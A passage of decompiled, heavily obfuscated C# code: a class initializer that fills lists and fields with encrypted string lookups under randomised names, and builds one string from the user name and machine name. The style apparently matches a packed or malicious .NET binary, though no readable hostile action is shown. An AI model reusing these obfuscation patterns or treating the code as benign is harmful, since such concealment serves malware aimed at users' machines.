			pimTPtzgsj(getString_0(107385118)),
			pimTPtzgsj(getString_0(107385053)),
			pimTPtzgsj(getString_0(107385004)),
			pimTPtzgsj(getString_0(107385427)),
			pimTPtzgsj(getString_0(107385394)),
			pimTPtzgsj(getString_0(107385333)),
			pimTPtzgsj(getString_0(107385276)),
			pimTPtzgsj(getString_0(107387148)),
			pimTPtzgsj(getString_0(107385251)),
			pimTPtzgsj(getString_0(107384666)),
			pimTPtzgsj(getString_0(107384609)),
			pimTPtzgsj(getString_0(107384532)),
			pimTPtzgsj(getString_0(107384471)),
			pimTPtzgsj(getString_0(107384478)),
			pimTPtzgsj(getString_0(107384913)),
			pimTPtzgsj(getString_0(107384896)),
			pimTPtzgsj(getString_0(107387986)),
			pimTPtzgsj(getString_0(107384831)),
			pimTPtzgsj(getString_0(107384758)),
			pimTPtzgsj(getString_0(107384733)),
			pimTPtzgsj(getString_0(107387921)),
			pimTPtzgsj(getString_0(107384116)),
			pimTPtzgsj(getString_0(107384099)),
			pimTPtzgsj(getString_0(107384010)),
			pimTPtzgsj(getString_0(107383945)),
			pimTPtzgsj(getString_0(107384376)),
			pimTPtzgsj(getString_0(107387799)),
			pimTPtzgsj(getString_0(107384331)),
			pimTPtzgsj(getString_0(107387115)),
			pimTPtzgsj(getString_0(107387782)),
			pimTPtzgsj(getString_0(107384298)),
			pimTPtzgsj(getString_0(107384209)),
			pimTPtzgsj(getString_0(107387205)),
			pimTPtzgsj(getString_0(107384176)),
			pimTPtzgsj(getString_0(107383647)),
			pimTPtzgsj(getString_0(107383566)),
			pimTPtzgsj(getString_0(107387563)),
			pimTPtzgsj(getString_0(107383541)),
			pimTPtzgsj(getString_0(107383528)),
			pimTPtzgsj(getString_0(107383499)),
			pimTPtzgsj(getString_0(107383438)),
			pimTPtzgsj(getString_0(107383425)),
			pimTPtzgsj(getString_0(107383904)),
			pimTPtzgsj(getString_0(107383879)),
			pimTPtzgsj(getString_0(107383802)),
			pimTPtzgsj(getString_0(107383809)),
			pimTPtzgsj(getString_0(107383736)),
			pimTPtzgsj(getString_0(107383723)),
			pimTPtzgsj(getString_0(107383130)),
			pimTPtzgsj(getString_0(107383105)),
			pimTPtzgsj(getString_0(107383072)),
			pimTPtzgsj(getString_0(107382995)),
			pimTPtzgsj(getString_0(107382962)),
			pimTPtzgsj(getString_0(107382953)),
			pimTPtzgsj(getString_0(107387572)),
			pimTPtzgsj(getString_0(107383130)),
			pimTPtzgsj(getString_0(107382912)),
			pimTPtzgsj(getString_0(107383395)),
			pimTPtzgsj(getString_0(107383366)),
			pimTPtzgsj(getString_0(107383285)),
			pimTPtzgsj(getString_0(107383276)),
			pimTPtzgsj(getString_0(107383183)),
			pimTPtzgsj(getString_0(107382630)),
			pimTPtzgsj(getString_0(107382601)),
			pimTPtzgsj(getString_0(107382568)),
			pimTPtzgsj(getString_0(107382495)),
			pimTPtzgsj(getString_0(107382466)),
			pimTPtzgsj(getString_0(107382389)),
			pimTPtzgsj(getString_0(107382836)),
			pimTPtzgsj(getString_0(107382803)),
			pimTPtzgsj(getString_0(107382790)),
			pimTPtzgsj(getString_0(107382729)),
			pimTPtzgsj(getString_0(107382696)),
			pimTPtzgsj(getString_0(107382107)),
			pimTPtzgsj(getString_0(107382042)),
			pimTPtzgsj(getString_0(107382009)),
			pimTPtzgsj(getString_0(107381968)),
			pimTPtzgsj(getString_0(107381951)),
			pimTPtzgsj(getString_0(107387699)),
			pimTPtzgsj(getString_0(107381922)),
			pimTPtzgsj(getString_0(107382377)),
			pimTPtzgsj(getString_0(107382336)),
			pimTPtzgsj(getString_0(107382259)),
			pimTPtzgsj(getString_0(107382250)),
			pimTPtzgsj(getString_0(107382205)),
			pimTPtzgsj(getString_0(107382144)),
			pimTPtzgsj(getString_0(107381551)),
			pimTPtzgsj(getString_0(107381534)),
			pimTPtzgsj(getString_0(107381477)),
			pimTPtzgsj(getString_0(107381420)),
			pimTPtzgsj(getString_0(107381375)),
			pimTPtzgsj(getString_0(107381814)),
			pimTPtzgsj(getString_0(107381789)),
			pimTPtzgsj(getString_0(107387642)),
			pimTPtzgsj(getString_0(107381684)),
			pimTPtzgsj(getString_0(107381655)),
			pimTPtzgsj(getString_0(107381622)),
			pimTPtzgsj(getString_0(107381069)),
			pimTPtzgsj(getString_0(107381040)),
			pimTPtzgsj(getString_0(107388292)),
			pimTPtzgsj(getString_0(107381031)),
			pimTPtzgsj(getString_0(107380950)),
			pimTPtzgsj(getString_0(107380921)),
			pimTPtzgsj(getString_0(107386015)),
			pimTPtzgsj(getString_0(107380888)),
			pimTPtzgsj(getString_0(107380921)),
			pimTPtzgsj(getString_0(107380859)),
			pimTPtzgsj(getString_0(107380862)),
			pimTPtzgsj(getString_0(107381345)),
			pimTPtzgsj(getString_0(107381264)),
			pimTPtzgsj(getString_0(107381247)),
			pimTPtzgsj(getString_0(107381174)),
			pimTPtzgsj(getString_0(107381113)),
			pimTPtzgsj(getString_0(107413340)),
			pimTPtzgsj(getString_0(107413299)),
			pimTPtzgsj(getString_0(107413286)),
			pimTPtzgsj(getString_0(107413209)),
			pimTPtzgsj(getString_0(107413176)),
			pimTPtzgsj(getString_0(107413151)),
			pimTPtzgsj(getString_0(107413586)),
			pimTPtzgsj(getString_0(107413529)),
			pimTPtzgsj(getString_0(107413496)),
			pimTPtzgsj(getString_0(107413455)),
			pimTPtzgsj(getString_0(107413426)),
			pimTPtzgsj(getString_0(107413365)),
			pimTPtzgsj(getString_0(107412820)),
			pimTPtzgsj(getString_0(107412763)),
			pimTPtzgsj(getString_0(107412722)),
			pimTPtzgsj(getString_0(107412705)),
			pimTPtzgsj(getString_0(107412672)),
			pimTPtzgsj(getString_0(107412591)),
			pimTPtzgsj(getString_0(107413090)),
			pimTPtzgsj(getString_0(107413009)),
			pimTPtzgsj(getString_0(107412996)),
			pimTPtzgsj(getString_0(107412915)),
			pimTPtzgsj(getString_0(107412882)),
			pimTPtzgsj(getString_0(107412873)),
			pimTPtzgsj(getString_0(107412320)),
			pimTPtzgsj(getString_0(107412243)),
			pimTPtzgsj(getString_0(107383276)),
			pimTPtzgsj(getString_0(107412210)),
			pimTPtzgsj(getString_0(107412201)),
			pimTPtzgsj(getString_0(107412112)),
			pimTPtzgsj(getString_0(107412083)),
			pimTPtzgsj(getString_0(107412562)),
			pimTPtzgsj(getString_0(107412529)),
			pimTPtzgsj(getString_0(107412512)),
			pimTPtzgsj(getString_0(107412483)),
			pimTPtzgsj(getString_0(107412406)),
			pimTPtzgsj(getString_0(107412393)),
			pimTPtzgsj(getString_0(107412352)),
			pimTPtzgsj(getString_0(107411783)),
			pimTPtzgsj(getString_0(107411702)),
			pimTPtzgsj(getString_0(107411673)),
			pimTPtzgsj(getString_0(107411660))
		};
		nPlsLUdMzje = new List<string>
		{
			pimTPtzgsj(getString_0(107411619)),
			pimTPtzgsj(getString_0(107412050)),
			pimTPtzgsj(getString_0(107412033)),
			pimTPtzgsj(getString_0(107411952)),
			pimTPtzgsj(getString_0(107411935)),
			pimTPtzgsj(getString_0(107411870)),
			pimTPtzgsj(getString_0(107411249)),
			pimTPtzgsj(getString_0(107411188))
		};
		AlRVdSbJkGYahty = new List<string>
		{
			pimTPtzgsj(getString_0(107411131)),
			pimTPtzgsj(getString_0(107411098)),
			pimTPtzgsj(getString_0(107411053)),
			pimTPtzgsj(getString_0(107411516)),
			pimTPtzgsj(getString_0(107411483)),
			pimTPtzgsj(getString_0(107411466)),
			pimTPtzgsj(getString_0(107411421)),
			pimTPtzgsj(getString_0(107411356)),
			pimTPtzgsj(getString_0(107411323)),
			pimTPtzgsj(getString_0(107410778)),
			pimTPtzgsj(getString_0(107410745)),
			pimTPtzgsj(getString_0(107410712)),
			pimTPtzgsj(getString_0(107410671)),
			pimTPtzgsj(getString_0(107410662)),
			pimTPtzgsj(getString_0(107410585)),
			pimTPtzgsj(getString_0(107410552)),
			pimTPtzgsj(getString_0(107411023)),
			pimTPtzgsj(getString_0(107410990)),
			pimTPtzgsj(getString_0(107410981)),
			pimTPtzgsj(getString_0(107410908)),
			pimTPtzgsj(getString_0(107410875)),
			pimTPtzgsj(getString_0(107410834)),
			pimTPtzgsj(getString_0(107410801)),
			pimTPtzgsj(getString_0(107411131)),
			pimTPtzgsj(getString_0(107410280)),
			pimTPtzgsj(getString_0(107410239)),
			pimTPtzgsj(getString_0(107410162)),
			pimTPtzgsj(getString_0(107410129)),
			pimTPtzgsj(getString_0(107410120)),
			pimTPtzgsj(getString_0(107410079)),
			pimTPtzgsj(getString_0(107410046)),
			pimTPtzgsj(getString_0(107410485)),
			pimTPtzgsj(getString_0(107410476)),
			pimTPtzgsj(getString_0(107411098)),
			pimTPtzgsj(getString_0(107410435)),
			pimTPtzgsj(getString_0(107411053)),
			pimTPtzgsj(getString_0(107410402)),
			pimTPtzgsj(getString_0(107410369)),
			pimTPtzgsj(getString_0(107410296)),
			pimTPtzgsj(getString_0(107409751)),
			pimTPtzgsj(getString_0(107409710)),
			pimTPtzgsj(getString_0(107409701)),
			pimTPtzgsj(getString_0(107409668)),
			pimTPtzgsj(getString_0(107409635)),
			pimTPtzgsj(getString_0(107409562)),
			pimTPtzgsj(getString_0(107409521)),
			pimTPtzgsj(getString_0(107410024))
		};
		ANQRNsZXZzDia = new List<string>
		{
			pimTPtzgsj(zujFUufZIGQ(getString_0(107409983))),
			pimTPtzgsj(getString_0(107409902)),
			pimTPtzgsj(getString_0(107409809)),
			pimTPtzgsj(getString_0(107409200)),
			pimTPtzgsj(getString_0(107409107)),
			pimTPtzgsj(getString_0(107409010)),
			pimTPtzgsj(getString_0(107409429)),
			pimTPtzgsj(getString_0(107409332)),
			pimTPtzgsj(getString_0(107408727)),
			pimTPtzgsj(getString_0(107408630)),
			pimTPtzgsj(getString_0(107408537)),
			pimTPtzgsj(getString_0(107408952)),
			pimTPtzgsj(getString_0(107408859)),
			pimTPtzgsj(zujFUufZIGQ(getString_0(107409983)))
		};
		rJEEtUlxByvk = pimTPtzgsj(getString_0(107408762));
		DYjGYBZIQrg = new List<string>
		{
			pimTPtzgsj(getString_0(107408169)),
			pimTPtzgsj(getString_0(107408487)),
			pimTPtzgsj(getString_0(107408293)),
			pimTPtzgsj(getString_0(107407587)),
			pimTPtzgsj(getString_0(107407905)),
			pimTPtzgsj(getString_0(107407199))
		};
		katNzSsTbLfO = new List<string>
		{
			pimTPtzgsj(getString_0(107407005)),
			pimTPtzgsj(getString_0(107407456)),
			pimTPtzgsj(getString_0(107407395))
		};
		nCfehNnAKELxwv = getString_0(107396815);
		BHLDrOtOPouZ = getString_0(107396815);
		LYRWvlBeRbQQh = new DateTime(2000, 1, 1);
		fowfTrnwRbl = new DateTime(2100, 1, 1);
		EcxEPMzKnUKdFyvU = getString_0(107396962);
		tKbCgjZzNwIevCY = getString_0(107389232);
		RyOSKcyQJaZWDx = getString_0(107396815);
		VvRFlDNeHQT = getString_0(107396815);
		xNpEYwFApuwschUf = getString_0(107396815);
		AXGpYShsxoIVrP = getString_0(107396962);
		ngrBBoIkNa = getString_0(107396815);
		dtpyECacgdgV = getString_0(107396815);
		MYtmFoSEPowjeCH = new List<string>
		{
			getString_0(107396265),
			getString_0(107396491),
			getString_0(107396299),
			getString_0(107395828)
		};
		YcDZJAXfkcwFEP = getString_0(107396815);
		QccyPlBKwOudBK = getString_0(107407334);
		IJtXsAfCJcow = getString_0(107396815);
		dgdSxQyeeVYCj = getString_0(107396815);
		vFffkfLzYWaM = getString_0(107396815);
		tHeSXcVDekJ = string.Empty;
		dhGWzxSbIZAsoL = getString_0(107396815);
		ICyzqPsMrxcdu = getString_0(107396962);
		GGRvjiXEYRVi = getString_0(107396815);
		bstXhyBqhrxQeFG = getString_0(107392185);
		naHGmHncrAR = getString_0(107392185);
		xeCsreEMTvOV = getString_0(107396815);
		UPrMWpKHXIHX = getString_0(107396815);
		uimqVbzddVnUhZ = getString_0(107396962);
		UtITZwDYADzLfz = getString_0(107396815);
		sCxQBwaMOK = getString_0(107396815);
		YudXkRlgvT = getString_0(107392423);
		FAoZTEaQKffBRAH = getString_0(107396815);
		fkciLeUUejpnid = getString_0(107396815);
		mfDWFlrTLvSVI = getString_0(107407329);
		nApHZxDfPX = getString_0(107396815);
		XgJRdSkdEDwvbK = getString_0(107396815);
		dFwowAEqlw = getString_0(107396815);
		uoZercbfcm = getString_0(107396815);
		WwmvyHoShcYd = getString_0(107407308);
		tDBEEMFtqLOZz = getString_0(107396962);
		rrRVvypnQbGQM = getString_0(107396962);
		nGjBwexNCJl = getString_0(107396815);
		zClvTeYQjHuj = getString_0(107396815);
		JTojuxgSqdxwybF = new string[0];
		mLyGnpszUKM = getString_0(107396815);
		jUTdQQEeFeYZhnmcv = true;
		tPDMXsYnXhyKK = getString_0(107396815);
		fpnZuwWWrCf = true;
		QuvIlKtixYqUmYGk = false;
		FYcbdFCfliPIkLX = false;
		snrxfLatiJx = false;
		RqqYTsMuxEQen = getString_0(107407295);
		AreaxgrYTj = false;
		qvKMXGNqEWEu = false;
		mXboGzoDiQU = true;
		YwGTeZrarTaZME = false;
		YBbHALckKieZ = true;
		RXHFwPNHqsMjt = getString_0(107407274) + Environment.UserName + getString_0(107407261) + Environment.MachineName + getString_0(107407240) + aOlPpFtnUBXreNv.FqqRnlVwFEkGH() + getString_0(107407235);
		caDnjGzwLlwQ = false;
		OCOEXPhqFQnIzLf = new Stopwatch();
		MtUrEdDRDzL = 0;
		YIvQxgIKBLMzUZ = 0;
		XszgYccOIzBT = false;
		HvklvwSSvrVzvZd = getString_0(107406682) + aOlPpFtnUBXreNv.FqqRnlVwFEkGH() + getString_0(107406673);
		sBysqOlvOkrR = new string[1] { getString_0(107406700) };
		MjFiqKPArxY = new List<string>();
		MaXcOliCaNJoej = 0;
	}
}
